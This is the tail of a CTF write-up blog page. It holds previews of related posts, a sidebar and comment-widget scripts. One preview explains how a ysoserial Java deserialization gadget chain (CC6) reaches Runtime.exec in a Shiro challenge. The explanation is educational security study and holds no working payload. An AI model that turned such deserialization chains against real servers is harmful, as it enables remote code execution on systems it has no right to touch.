Week2-搞点哦润吉吃吃🍊</div></div><div class="info-2"><div class="info-item-1">NewStar CTF 2025 Week2-搞点哦润吉吃吃🍊登录，账户密码在源代码 登陆后开始挑战，写脚本就行 先要知道几个重要信息，提示抓包，那抓包看看  说明start响应页面的setcookie会作为下面verify页面的session 这里不一样应该是因为过了几次我想到还有一个验证页面  我们只需写一个脚本，满足： 从登陆后的响应中拿到session，和计算式子然后拿到计算结果去挑战 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960import requestsdef auto_challenge():    base_url = &quot;http://127.0.0.1:17375&quot;    headers = &#123;        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) A...</div></div></div></a><a class="pagination-related" href="/2026/02/01/ctf%E9%A2%98%E8%A7%A3/web/%5BNPUCTF2020%5DEzShiro%2048/" title="[NPUCTF2020]EzShiro 48"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-02-01</div><div class="info-item-2">[NPUCTF2020]EzShiro 48</div></div><div class="info-2"><div class="info-item-1">[NPUCTF2020]EzShiro48 这道题目我做了三天，虽然不是持续做，但是仍任磨练意志力； 我于2026.2.1 23:25决定只学原理不找flag了  1. 原始形态：反序列化“炸弹”长啥样？在你执行 ysoserial 生成 payload.ser 时，它本质上是一个 Java 序列化对象流。如果你用十六进制查看器（Hex Editor）打开它，你会看到：  文件头：总是以 AC ED 00 05 开头（这是 Java 序列化对象的魔法数字）。 内容：里面并不是代码，而是一串嵌套的对象。 最外层是一个 HashSet（在 CC6 链中）。 里面包裹着 TiedMapEntry。 最核心的是 LazyMap 和 ChainedTransformer。   逻辑：它像一串精心排布的多米诺骨牌。当这个对象被“反序列化”（即从字节还原成对象）时，Java 会自动调用它的 readObject() 方法。第一块骨牌倒下，最终会触发 Runtime.getRuntime().exec() 执行你的命令。   2. Shiro 的“快递拆包”原理当你把这串字节发送给服务器时，Sh...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comments</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/images/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">John Doe</div><div class="author-info-description">不要放弃自由去选择保障，到头来你两者都得不到</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">121</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">70</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/你的GitHub用户名"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/2829750658t-svg" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://blog.csdn.net/2501_93165324?type=blog" target="_blank" title="CSDN"><i class="fas fa-blog" style="color: #fc5531;"></i></a><a class="social-icon" href="https://music.163.com/#/user/home?id=1761301549" target="_blank" title="NetEaseCloud"><i class="fas fa-music" style="color: #c20c0c;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">欢迎来到我的博客！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SCTF2019-Flag-Shop"><span class="toc-number">1.</span> <span class="toc-text">[SCTF2019]Flag Shop</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1"><span class="toc-number">2.</span> <span class="toc-text">1</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/06/22/%E5%85%A8%E7%AB%99%E6%9B%B4%E6%96%B0%E8%AE%B0%E5%BD%95/" title="全站更新记录">全站更新记录</a><time datetime="2026-06-22T13:33:29.000Z" title="Created 2026-06-22 21:33:29">2026-06-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/06/22/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/" title="我的第一篇博客">我的第一篇博客</a><time datetime="2026-06-22T13:33:29.000Z" title="Created 2026-06-22 21:33:29">2026-06-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/06/22/linux/%E9%9F%A9%E9%A1%BA%E5%B9%B3linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="韩顺平linux学习笔记">韩顺平linux学习笔记</a><time datetime="2026-06-22T13:08:37.000Z" title="Created 2026-06-22 21:08:37">2026-06-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/06/22/linux/%E9%BB%91%E9%A9%AClinux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="黑马linux学习笔记">黑马linux学习笔记</a><time datetime="2026-06-22T13:08:12.000Z" title="Created 2026-06-22 21:08:12">2026-06-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/06/22/ctf%E9%A2%98%E8%A7%A3/web/NewStar%20CTF%202025%20Week3-who'ssti/" title="NewStar CTF 2025 Week3-who'ssti">NewStar CTF 2025 Week3-who'ssti</a><time datetime="2026-06-22T13:06:29.000Z" title="Created 2026-06-22 21:06:29">2026-06-22</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By John Doe</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.2</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.5</a></span></div><div class="footer_custom_text"><a href="https://beian.miit.gov.cn/" target="_blank">浙ICP备2026034087号</a>
+</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll to Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.5"></script><script src="/js/main.js?v=5.5.5"></script><div class="js-pjax"><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = null
+
+  const getCount = () => {
+    const countELement = document.getElementById('twikoo-count')
+    if(!countELement) return
+    twikoo.getCommentsCount({
+      envId: 'https://twikoo-blog-kappa.vercel.app',
+      region: '',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(res => {
+      countELement.textContent = res[0].count
+    }).catch(err => {
+      console.error(err)
+    })
+  }
+
+  const init = (el = document, path = location.pathname) => {
+    twikoo.init({
+      el: el.querySelector('#twikoo-wrap'),
+      envId: 'https://twikoo-blog-kappa.vercel.app',
+      region: '',
+      onCommentLoaded: () => {
+        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
+      },
+      ...option,
+      path: isShuoshuo ? path : (option && option.path) || path
+    })
+
+    
+
+    isShuoshuo && (window.shuoshuoComment.destroyTwikoo = () => {
+      if (el.children.length) {
+        el.innerHTML = ''
+        el.classList.add('no-comment')
+      }
+    })
+  }
+
+  const loadTwikoo = (el, path) => {
+    if (typeof twikoo === 'object') setTimeout(() => init(el, path), 0)
+    else btf.getScript('https://cdn.jsdelivr.net/npm/twikoo@1.7.11/dist/twikoo.all.min.js').then(() => init(el, path))
+  }
+
+  if (isShuoshuo) {
+    'Twikoo' === 'Twikoo'
+      ? window.shuoshuoComment = { loadComment: loadTwikoo }
+      : window.loadOtherComment = loadTwikoo
+    return
+  }
+
+  if ('Twikoo' === 'Twikoo' || !true) {
+    if (true) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else loadTwikoo()
+  } else {
+    window.loadOtherComment = loadTwikoo
+  }
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading Database</span></div><div class="local-search-input"><input placeholder="搜索文章..." type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.5"></script></div></div></body></html>
